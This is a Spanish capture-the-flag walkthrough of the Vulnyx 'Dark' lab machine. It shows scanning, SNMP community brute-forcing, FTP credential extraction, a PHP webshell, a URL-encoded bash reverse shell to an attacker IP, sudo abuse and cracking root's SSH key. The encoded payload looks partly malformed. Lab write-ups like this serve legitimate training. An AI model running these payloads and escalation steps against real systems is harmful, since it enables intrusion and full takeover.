# Vulnyx-Dark

## Reconocimiento

### Descubrir la IP de la víctima
```bash
arp-scan -I eth0 --localnet
# (IP-victima) 08:00:27:53:f0:2d   PCS Systemtechnik GmbH
```

### Escaneo de puertos
```bash
nmap -p 22,80,8000 -sS -sC -sV -n -Pn (IP-victima) -oN nmap
# 22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1
# 80/tcp   open  http    Apache httpd 2.4.56 (Debian)
# 8000/tcp open  ftp     pyftpdlib 1.5.7
```

### Escaneo UDP
```bash
nmap -sU -p- --min-rate 2000 -sV (IP-victima)
# 161/udp   open   snmp   net-snmp; net-snmp SNMPv3 server
```

## Enumeración SNMP (extraccion clave de comunidad)
```bash
onesixtyone -c /home/kali/wordlists666/common-snmp-community-strings-onesixtyone.txt (IP-victima)
# (IP-victima) [root] Linux dark 5.10.0-23-amd64
```

```bash
snmpwalk -v 2c -c root (IP-victima) | grep usr 
# iso.3.6.1.2.1.25.4.2.1.5.354 = STRING: "-c /usr/bin/python3 -m pyftpdlib -p 8000 -w -d /var/www/html/ -u frank -P my_FTP_is_c00l"
```

## Explotación FTP
```bash
ftp (IP-victima) -p 8000
# usr: frank
# pass: m*_***_**_***l
```

## Subida de Webshell
Subir una webshell PHP (`put webshell.php`) con el siguiente contenido:
```php
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

## Ejecución de Comandos
Acceder a la webshell desde el navegador:
```bash
http://(IP-victima)/webshell.php?cmd=whoami
# frank
```

## Reverse Shell
Inyectar un reverse shell:
```bash
http://(IP-victima)/webshell.php?cmd=%62%61%73%68%20%2d%63%20%225%62%361%73%68%20%2d%659%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%359%32%2e5%31%363%38%2e%32%30%304%2e%35%2f%34%34%33%20%3033e%26%31%22
```

## Obtener Acceso
```bash
nc -lvnp 443
# Acceso obtenido
```

## Escalada de Privilegios
```bash
script /dev/null -c bash
# (Ctrl + Z)
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## Pivoteo de Usuarios
```bash
sudo -l
# (alan) NOPASSWD: /usr/bin/sh
(podemos tirarnos una bash como el usuario alan)
sudo -u alan /usr/bin/sh
whoami
# alan
```

## Escalada de Privilegios a Root
```bash
sudo -l
# (root) NOPASSWD: /usr/bin/most
(Al ejecutarlo vemos que podemos leer archivos como root.)
sudo /usr/bin/most /root/.ssh/id_rsa > /tmp/id_rsa.txt
cat /tmp/id_rsa.txt
# Contenido de id_rsa de root
```

## Acceso SSH como Root
```bash
nano id_rsa
#pegamos contenido de id_rsa root
ssh2john id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa

ssh -i id_rsa root@(IP-victima)
# Contraseña: rootbeer
# Acceso concedido como root
```

Ya somos root :D

